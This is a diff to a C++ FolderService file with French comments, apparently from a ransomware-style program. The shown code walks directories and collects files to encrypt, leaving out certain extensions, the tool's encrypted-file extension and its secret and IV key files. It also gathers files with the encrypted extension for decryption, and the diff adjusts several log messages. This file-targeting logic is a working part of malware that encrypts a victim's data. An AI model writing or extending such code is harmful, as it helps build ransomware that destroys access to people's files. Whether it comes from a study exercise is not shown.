@@ -1,4 +1,5 @@
 #include "Folderservice.h"
+#include "rsaencryptor.h"
 
 FolderService::FolderService() {
     // Initialisation de la liste statique des parties de chemins à écarter
@@ -35,6 +36,8 @@ FolderService::FolderService() {
     m_exclude_paths.push_back(".bkf");
     m_exclude_paths.push_back(".svg");
     m_exclude_paths.push_back(RSAEncryptor::ENCRYPTED_FILES_EXTENSION);
+    m_exclude_paths.push_back(RSAEncryptor::SECRET_FILE);
+    m_exclude_paths.push_back(RSAEncryptor::IV_FILE);
 }
 
 std::vector<std::string> FolderService::list_files_for_encryption() {
@@ -52,9 +55,9 @@ std::vector<std::string> FolderService::list_files_for_encryption() {
 
             if (!exclude) {
                 m_data_files.push_back(path);
-                std::cout<<"[ENCRYPTION-ERROR] [File to encrypt]: "<<path<<std::endl;
+                std::cout<<"[ENCRYPTION] [File to encrypt]: "<<path<<std::endl;
             } else {
-                std::cout<<"[ENCRYPTION-ERROR] [Excluded file/Repo]: "<<path<<std::endl;
+                std::cout<<"[ENCRYPTION] [Excluded file/Repo]: "<<path<<std::endl;
             }
         }
     }
@@ -72,16 +75,10 @@ std::vector<std::string> FolderService::list_files_for_decryption() {
         } else if (boost::filesystem::is_regular_file(it->path())) {
             std::string path = it->path().string();
 
-            // Vérifie si le chemin contient l'une des parties de chemins à écarter
-            bool exclude = is_excluded(path);
-
-            if (!exclude) {
-                if(path.find(RSAEncryptor::ENCRYPTED_FILES_EXTENSION) != std::string::npos) {
-                    m_data_files.push_back(path);
-                    std::cout<<"[DECRYPTION-ERROR] [File to decrypt]: "<<path<<std::endl;
-                }
-            } else {
-                std::cout<<"[DECRYPTION-ERROR] [Excluded file/Repo]: "<<path<<std::endl;
+            if(RSAEncryptor::ENCRYPTED_FILES_EXTENSION.compare(it->path().extension().string()) == 0) {
+                std::cout<<"Extension: \""<<it->path().extension().string()<<"\""<<std::endl;
+                m_data_files.push_back(path);
+                std::cout<<"[File to decrypt]: "<<path<<" (Extension: \""<<it->path().extension().string()<<"\")"<<std::endl;
             }
         }
     }
@@ -105,7 +102,7 @@ void FolderService::list_files_in_directory_for_encryption(boost::filesystem::pa
                     list_files_in_directory_for_encryption(it->path());
                 }
             } else {
-                std::cout<<"[ENCRYPTION-ERROR] [Excluded file/Repo]: "<<path<<std::endl;
+                std::cout<<"[ENCRYPTION] [Excluded file/Repo]: "<<path<<std::endl;
             }
         }
     } catch (const boost::filesystem::filesystem_error& e) {
@@ -122,7 +119,7 @@ void FolderService::list_files_in_directory_for_decryption(boost::filesystem::pa
                 if(RSAEncryptor::ENCRYPTED_FILES_EXTENSION.compare(it->path().extension().string()) == 0) {
                     std::cout<<"Extension: \""<<it->path().extension().string()<<"\""<<std::endl;
                     m_data_files.push_back(path);
-                    std::cout<<"[File to decrypt]: "<<path<<std::endl;
+                    std::cout<<"[File to decrypt]: "<<path<<" (Extension: \""<<it->path().extension().string()<<"\")"<<std::endl;
                 }
             } else if (boost::filesystem::is_directory(it->path())) {
                 list_files_in_directory_for_decryption(it->path());
